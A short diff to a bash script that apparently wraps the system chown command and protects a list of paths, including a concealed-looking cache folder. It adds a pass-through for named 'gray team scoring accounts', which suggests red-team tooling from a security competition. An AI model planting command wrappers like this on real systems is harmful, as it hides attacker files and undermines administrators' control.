@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_CHOWN="/bin/chown"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_CHOWN "$@" ;;
+esac
+
+
 PROTECTED=(
     "/usr/local/bin"
     "/var/lib/apt/lists/.cache"
